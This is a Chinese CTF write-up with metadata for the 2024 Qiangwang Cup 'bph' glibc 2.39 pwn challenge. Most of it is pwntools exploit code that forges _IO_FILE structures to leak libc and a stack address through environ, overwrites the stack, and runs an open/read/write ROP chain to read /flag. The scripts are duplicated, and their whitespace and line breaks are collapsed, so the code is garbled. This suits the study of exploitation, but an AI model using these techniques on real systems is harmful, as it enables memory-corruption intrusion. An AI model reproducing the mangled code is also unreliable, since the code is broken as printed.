---
title: web选手入门pwn(31.5) 强网杯bph stack-leak 变种
contest: 强网杯
year: 2024
difficulty: hard
vuln_type: heap_exploit
tags:
- glibc-2.39
- _IO_FILE
- _IO_write_base-leak
- environ
- stack-read
- House-of-Apple
attack_chain: 'send A*0x28 泄 libc/choice=1 写一字节 0x00 到 stdin->_IO_buf_base 切断输入/伪造 stdin buf 指向 stdout+0x200 区可任意写 fake_stdout/伪造 fake_read_file: _IO_write_base=environ, _IO_write_ptr=environ+8, vtable=_IO_file_jumps 触发 puts 打印 environ → 泄 stack_N/再次伪造 fake_write_file: _IO_buf_base=stack_N, vtable=_IO_wfile_jumps 触发 gets 写栈上/栈上布置 ROP'
key_payload: 'fake_file_write = flat({0x00: 0x800|0x1000, 0x20: environ, 0x28: environ+8, 0x70: 1, 0x68: stdin, 0xd8: _IO_file_jumps}, filler=b"\x00")'
one_liner: 强网杯 bph 变种，通过 _IO_write_base/_IO_write_ptr 范围读 environ 泄栈，再用 _IO_buf_base 改写栈。
lesson: 伪造 _IO_FILE 的 `_IO_write_base/_IO_write_ptr` 范围可触发 `puts` 读任意地址；`environ` 符号永远指向 __libc_start_main 栈帧，是稳定的栈地址锚点；同一 fake_file 多次重用，每次根据 vtable 切换触发不同 IO 操作。
quality: high
full_path: web选手入门pwn(31.5)——强网杯bph.full.md
meta_path: web选手入门pwn(31.5)——强网杯bph.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: web选手入门pwn(31.5) 强网杯bph stack-leak 变种。强网杯 bph 变种，通过 _IO_write_base/_IO_write_ptr 范围读 environ 泄栈，再用 _IO_buf_base 改写栈。。经验：伪造 _IO_FILE 的 `_IO_write_base/_IO_write_ptr` 范围可触发 `puts` 读任...
category: pwn
subcategory: heap_exploitation
tools_used:
- ROP
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/289285.html
reasoning_chain:
- send 'A'*0x28 泄 libc + choice=1 写一字节 0x00 到 stdin->_IO_buf_base 切断输入 → 触发点：跟 PWN31 同样的入口
- 伪造 stdin buf 指向 stdout+0x200 区可任意写 fake_stdout → 动作：choice 后 send p64(stdout)+p64(stdout+0x200)
- 假设：伪造 fake_read_file 触发 puts 读 environ 泄栈 → 动作：_IO_write_base=environ / _IO_write_ptr=environ+8 / vtable=_IO_file_jumps
- 观察：stack_N=u64(sh.recvuntil('x7f')[-6:]+'x00x00') → 下一步：伪造 fake_write_file 改栈
- 动作：fake_write_file._IO_buf_base=stack_N / _IO_buf_end=stack_N+0x100 / vtable=_IO_wfile_jumps 触发 gets 写栈上
- 动作：栈上布置 ORW ROP（open/read/write）→ 完成
failed_attempts:
- 试图用 fake_stdout 一步到 ROP → 失败：必须先泄 stack 才有栈地址锚点
- 试图用 vtable 直接调 system → 失败：vtable 在只读页
- 试图覆盖 _IO_read_ptr → 失败：gets 走的是 _IO_buf_base/_IO_buf_end
key_observations:
- 伪造 _IO_FILE 的 _IO_write_base/_IO_write_ptr 范围可触发 puts 读任意地址
- environ 符号永远指向 __libc_start_main 栈帧，是稳定的栈地址锚点
- 同一 fake_file 多次重用，每次根据 vtable 切换触发不同 IO 操作
- glibc 2.39 House-of-Apple 是当前主流 IO 攻击路径
prerequisites:
- IO_FILE 攻击链（puts/printf/gets 触发条件）
- environ 栈地址泄漏原理
- ORW shellcode 拼装
- Pwntools + pwncli IO_FILE_plus_struct 构造
---
# web选手入门pwn(31.5)——强网杯bph

> 原文: https://www.ctfiot.com/289285.html
> ID: 289285

fake_file_write = flat({ 0x00:
0x800|0x1000,# _flags = 0x1800 0x20: 需要泄露的起始地址,# _IO_write_base 0x28: 需要泄露的终止地址,# _IO_write_ptr 0x70:1,# _fileno 0x68: 下一个调用的fakefile地址,# _chain = stdin 保持原指针 0xd8: _IO_file_jumps,# vtable 同样保持原指针}, filler=b"x00")

frompwnimport*frompwncliimport*context.log_level ='debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']sh = gdb.debug("./chall","b *0x55555555535an c")#sh = process("./chall")libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")rop = ROP(libc)sh.sendafter("token:","A"*0x28)libc_N = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")libc_base = libc_N -0xadd9eprint("libc_base: "+hex(libc_base))stdout = libc.sym['_IO_2_1_stdout_'] + libc_basestdin = libc.sym["_IO_2_1_stdin_"] + libc_basesystem = libc.sym['system'] + libc_basewfile_jumps = libc.sym['_IO_wfile_jumps'] + libc_basefile_jumps = libc.sym['_IO_file_jumps'] + libc_basewide_data = stdout -0xde0environ = libc.sym['environ'] + libc_baselibc_pop_rdi = rop.find_gadget(['pop rdi','ret'])[0] + libc_baselibc_pop_rsi = rop.find_gadget(['pop rsi','ret'])[0] + libc_baseset_rdx = libc_base+0x1a1f6b # mov dl, 0x65 ; retopen= libc.sym["open"] + libc_baseread = libc.sym["read"] + libc_basewrite = libc.sym["write"] + libc_basesh.sendlineafter("Choice:","1")#stdin->_IO_buf_base write 0x00sh.sendlineafter("Size:",str(stdin+56+1))sh.sendlineafter("Content:","")sh.recvuntil("bad choice")#stdin->_IO_buf_base = stdout stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout) + p64(stdout+0x200))#0x7ffff7e19de0#0x7ffff7e19ec9file_read = IO_FILE_plus_struct()file_read.flags =0x1800file_read._IO_write_base = environ #read stackfile_read._IO_write_ptr = environ +0x8 #read stackfile_read.fileno =1file_read.chain = stdinfile_read._lock = stdout +0x300 # stdout->_lock can write and free addrfile_read._wide_data = wide_datafile_read.vtable = file_jumps#stdout = fake_stdoutsh.sendafter("Choice:",bytes(file_read))sh.interactive()

file_read= IO_FILE_plus_struct()file_read.flags=0x1800file_read._IO_read_ptr= stdout +0x300file_read._IO_read_end= stdout +0x300file_read._IO_read_base= stdout +0x300file_read._IO_write_base= environ #print stackfile_read._IO_write_ptr = environ +0x8 #print stackfile_read._IO_write_end= stdout +0x300file_read._IO_buf_base= stdout +0x300file_read._IO_buf_end= stdout +0x301file_read.fileno =1file_read.chain = stdinfile_read._lock= stdout +0x300 # stdout->_lock can write and free addrfile_read._wide_data= wide_datafile_read.vtable= file_jumps

stack_N= u64(sh.recvuntil("x7f")[-6:]+b"x00x00")print("stack_N: "+hex(stack_N)) #0x7fffffffe3f8fori in range(0,7): print(i) sh.recvuntil("bad choice")#0x7ffff7e19630#0x7ffff7e19790file_wrtie= IO_FILE_plus_struct()file_wrtie.flags =0file_wrtie._IO_buf_base = stack_N #readstackfile_wrtie._IO_buf_end = stack_N+0x100 #readstackfile_wrtie.fileno =0file_wrtie._lock = stdout +0x300 # stdout->_lock can write and free addrfile_wrtie._codecvt = file_jumps -0x48 # _wide_data->_wide_vtable = p *(struct _IO_jump_t *)0x7ffff7f88fe8 ; call _IO_new_file_underflowfile_wrtie._wide_data = stdout -0x48 # stdout->_wide_data = p *(struct _IO_wide_data *)0x7ffff7f8b578file_wrtie.vtable = wfile_jumpssh.sendafter("Choice:", bytes(file_wrtie))

frompwn import *frompwncli import *context.log_level = 'debug'context.arch='amd64'context.terminal =['tmux','splitw','-h']#sh = gdb.debug("./chall" , "b *0x55555555535an c")sh= process("./chall")libc= ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")rop= ROP(libc)sh.sendafter("token:","A"*0x28)libc_N= u64(sh.recvuntil("x7f")[-6:]+b"x00x00")libc_base= libc_N -0xadd9eprint("libc_base: "+hex(libc_base))stdout= libc.sym['_IO_2_1_stdout_'] + libc_basestdin= libc.sym["_IO_2_1_stdin_"] + libc_basesystem= libc.sym['system'] + libc_basewfile_jumps= libc.sym['_IO_wfile_jumps'] + libc_basefile_jumps= libc.sym['_IO_file_jumps'] + libc_basewide_data= stdout -0xde0environ= libc.sym['environ'] + libc_baselibc_pop_rdi= rop.find_gadget(['pop rdi', 'ret'])[0] + libc_baselibc_pop_rsi= rop.find_gadget(['pop rsi', 'ret'])[0] + libc_baseset_rdx= libc_base+0x1a1f6b # mov dl,0x65 ; retopen= libc.sym["open"] + libc_baseread= libc.sym["read"] + libc_basewrite= libc.sym["write"] + libc_basesh.sendlineafter("Choice:","1")#stdin->_IO_buf_base write 0x00sh.sendlineafter("Size:",str(stdin+56+1))sh.sendlineafter("Content:","")sh.recvuntil("bad choice")#stdin->_IO_buf_base = stdout stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout) + p64(stdout+0x200))#0x7ffff7e19de0#0x7ffff7e19ec9file_read= IO_FILE_plus_struct()file_read.flags =0x1800file_read._IO_read_ptr = stdout +0x300file_read._IO_read_end = stdout +0x300file_read._IO_read_base = stdout +0x300file_read._IO_write_base = environ #readstackfile_read._IO_write_ptr = environ +0x8 #readstackfile_read._IO_write_end = stdout +0x300file_read._IO_buf_base = stdout +0x300file_read._IO_buf_end = stdout +0x301file_read.fileno =1file_read.chain = stdinfile_read._lock = stdout +0x300 # stdout->_lock can write and free addrfile_read._wide_data = wide_datafile_read.vtable = file_jumps#stdout = fake_stdoutsh.sendafter("Choice:", bytes(file_read))stack_N= u64(sh.recvuntil("x7f")[-6:]+b"x00x00")print("stack_N: "+hex(stack_N)) #0x7fffffffe3f8fori in range(0,7): print(i) sh.recvuntil("bad choice")#0x7ffff7e19630#0x7ffff7e19790file_wrtie= IO_FILE_plus_struct()file_wrtie.flags =0 # stdout->_flags =0file_wrtie._IO_buf_base = stack_N-800file_wrtie._IO_buf_end = stack_N-800+0x100file_wrtie.fileno =0file_wrtie._lock = stdout +0x300 # stdout->_lock can write and free addrfile_wrtie._codecvt = file_jumps -0x48 # _wide_data->_wide_vtable = p *(struct _IO_jump_t *)0x7ffff7f88fe8 ; call _IO_new_file_underflowfile_wrtie._wide_data = stdout -0x48 # stdout->_wide_data = p *(struct _IO_wide_data *)0x7ffff7f8b578file_wrtie.vtable = wfile_jumpssh.sendafter("Choice:", bytes(file_wrtie) + b"/flagx00x00x00")rop_shellcode = p64(libc_pop_rdi) + p64(stdout+0xe0) + p64(libc_pop_rsi) + p64(0) + p64(open)rop_shellcode+= p64(libc_pop_rdi) + p64(0x3) + p64(libc_pop_rsi) + p64(stdout+0x200) + p64(set_rdx) + p64(read)rop_shellcode+= p64(libc_pop_rdi) + p64(0x1) + p64(libc_pop_rsi) + p64(stdout+0x200) + p64(set_rdx) + p64(write)sleep(1)sh.send(rop_shellcode)sh.interactive()


```
fake_file_write = flat({ 0x00:
0x800|0x1000,# _flags = 0x1800 0x20: 需要泄露的起始地址,# _IO_write_base 0x28: 需要泄露的终止地址,# _IO_write_ptr 0x70:1,# _fileno 0x68: 下一个调用的fakefile地址,# _chain = stdin 保持原指针 0xd8: _IO_file_jumps,# vtable 同样保持原指针}, filler=b"x00")
frompwnimport*frompwncliimport*context.log_level ='debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']sh = gdb.debug("./chall","b *0x55555555535an c")#sh = process("./chall")libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")rop = ROP(libc)sh.sendafter("token:","A"*0x28)libc_N = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")libc_base = libc_N -0xadd9eprint("libc_base: "+hex(libc_base))stdout = libc.sym['_IO_2_1_stdout_'] + libc_basestdin = libc.sym["_IO_2_1_stdin_"] + libc_basesystem = libc.sym['system'] + libc_basewfile_jumps = libc.sym['_IO_wfile_jumps'] + libc_basefile_jumps = libc.sym['_IO_file_jumps'] + libc_basewide_data = stdout -0xde0environ = libc.sym['environ'] + libc_baselibc_pop_rdi = rop.find_gadget(['pop rdi','ret'])[0] + libc_baselibc_pop_rsi = rop.find_gadget(['pop rsi','ret'])[0] + libc_baseset_rdx = libc_base+0x1a1f6b # mov dl, 0x65 ; retopen= libc.sym["open"] + libc_baseread = libc.sym["read"] + libc_basewrite = libc.sym["write"] + libc_basesh.sendlineafter("Choice:","1")#stdin->_IO_buf_base write 0x00sh.sendlineafter("Size:",str(stdin+56+1))sh.sendlineafter("Content:","")sh.recvuntil("bad choice")#stdin->_IO_buf_base = stdout stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout) + p64(stdout+0x200))#0x7ffff7e19de0#0x7ffff7e19ec9file_read = IO_FILE_plus_struct()file_read.flags =0x1800file_read._IO_write_base = environ #read stackfile_read._IO_write_ptr = environ +0x8 #read stackfile_read.fileno =1file_read.chain = stdinfile_read._lock = stdout +0x300 # stdout->_lock can write and free addrfile_read._wide_data = wide_datafile_read.vtable = file_jumps#stdout = fake_stdoutsh.sendafter("Choice:",bytes(file_read))sh.interactive()
file_read= IO_FILE_plus_struct()file_read.flags=0x1800file_read._IO_read_ptr= stdout +0x300file_read._IO_read_end= stdout +0x300file_read._IO_read_base= stdout +0x300file_read._IO_write_base= environ #print stackfile_read._IO_write_ptr = environ +0x8 #print stackfile_read._IO_write_end= stdout +0x300file_read._IO_buf_base= stdout +0x300file_read._IO_buf_end= stdout +0x301file_read.fileno =1file_read.chain = stdinfile_read._lock= stdout +0x300 # stdout->_lock can write and free addrfile_read._wide_data= wide_datafile_read.vtable= file_jumps
stack_N= u64(sh.recvuntil("x7f")[-6:]+b"x00x00")print("stack_N: "+hex(stack_N)) #0x7fffffffe3f8fori in range(0,7): print(i) sh.recvuntil("bad choice")#0x7ffff7e19630#0x7ffff7e19790file_wrtie= IO_FILE_plus_struct()file_wrtie.flags =0file_wrtie._IO_buf_base = stack_N #readstackfile_wrtie._IO_buf_end = stack_N+0x100 #readstackfile_wrtie.fileno =0file_wrtie._lock = stdout +0x300 # stdout->_lock can write and free addrfile_wrtie._codecvt = file_jumps -0x48 # _wide_data->_wide_vtable = p *(struct _IO_jump_t *)0x7ffff7f88fe8 ; call _IO_new_file_underflowfile_wrtie._wide_data = stdout -0x48 # stdout->_wide_data = p *(struct _IO_wide_data *)0x7ffff7f8b578file_wrtie.vtable = wfile_jumpssh.sendafter("Choice:", bytes(file_wrtie))
frompwn import *frompwncli import *context.log_level = 'debug'context.arch='amd64'context.terminal =['tmux','splitw','-h']#sh = gdb.debug("./chall" , "b *0x55555555535an c")sh= process("./chall")libc= ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")rop= ROP(libc)sh.sendafter("token:","A"*0x28)libc_N= u64(sh.recvuntil("x7f")[-6:]+b"x00x00")libc_base= libc_N -0xadd9eprint("libc_base: "+hex(libc_base))stdout= libc.sym['_IO_2_1_stdout_'] + libc_basestdin= libc.sym["_IO_2_1_stdin_"] + libc_basesystem= libc.sym['system'] + libc_basewfile_jumps= libc.sym['_IO_wfile_jumps'] + libc_basefile_jumps= libc.sym['_IO_file_jumps'] + libc_basewide_data= stdout -0xde0environ= libc.sym['environ'] + libc_baselibc_pop_rdi= rop.find_gadget(['pop rdi', 'ret'])[0] + libc_baselibc_pop_rsi= rop.find_gadget(['pop rsi', 'ret'])[0] + libc_baseset_rdx= libc_base+0x1a1f6b # mov dl,0x65 ; retopen= libc.sym["open"] + libc_baseread= libc.sym["read"] + libc_basewrite= libc.sym["write"] + libc_basesh.sendlineafter("Choice:","1")#stdin->_IO_buf_base write 0x00sh.sendlineafter("Size:",str(stdin+56+1))sh.sendlineafter("Content:","")sh.recvuntil("bad choice")#stdin->_IO_buf_base = stdout stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout) + p64(stdout+0x200))#0x7ffff7e19de0#0x7ffff7e19ec9file_read= IO_FILE_plus_struct()file_read.flags =0x1800file_read._IO_read_ptr = stdout +0x300file_read._IO_read_end = stdout +0x300file_read._IO_read_base = stdout +0x300file_read._IO_write_base = environ #readstackfile_read._IO_write_ptr = environ +0x8 #readstackfile_read._IO_write_end = stdout +0x300file_read._IO_buf_base = stdout +0x300file_read._IO_buf_end = stdout +0x301file_read.fileno =1file_read.chain = stdinfile_read._lock = stdout +0x300 # stdout->_lock can write and free addrfile_read._wide_data = wide_datafile_read.vtable = file_jumps#stdout = fake_stdoutsh.sendafter("Choice:", bytes(file_read))stack_N= u64(sh.recvuntil("x7f")[-6:]+b"x00x00")print("stack_N: "+hex(stack_N)) #0x7fffffffe3f8fori in range(0,7): print(i) sh.recvuntil("bad choice")#0x7ffff7e19630#0x7ffff7e19790file_wrtie= IO_FILE_plus_struct()file_wrtie.flags =0 # stdout->_flags =0file_wrtie._IO_buf_base = stack_N-800file_wrtie._IO_buf_end = stack_N-800+0x100file_wrtie.fileno =0file_wrtie._lock = stdout +0x300 # stdout->_lock can write and free addrfile_wrtie._codecvt = file_jumps -0x48 # _wide_data->_wide_vtable = p *(struct _IO_jump_t *)0x7ffff7f88fe8 ; call _IO_new_file_underflowfile_wrtie._wide_data = stdout -0x48 # stdout->_wide_data = p *(struct _IO_wide_data *)0x7ffff7f8b578file_wrtie.vtable = wfile_jumpssh.sendafter("Choice:", bytes(file_wrtie) + b"/flagx00x00x00")rop_shellcode = p64(libc_pop_rdi) + p64(stdout+0xe0) + p64(libc_pop_rsi) + p64(0) + p64(open)rop_shellcode+= p64(libc_pop_rdi) + p64(0x3) + p64(libc_pop_rsi) + p64(stdout+0x200) + p64(set_rdx) + p64(read)rop_shellcode+= p64(libc_pop_rdi) + p64(0x1) + p64(libc_pop_rsi) + p64(stdout+0x200) + p64(set_rdx) + p64(write)sleep(1)sh.send(rop_shellcode)sh.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]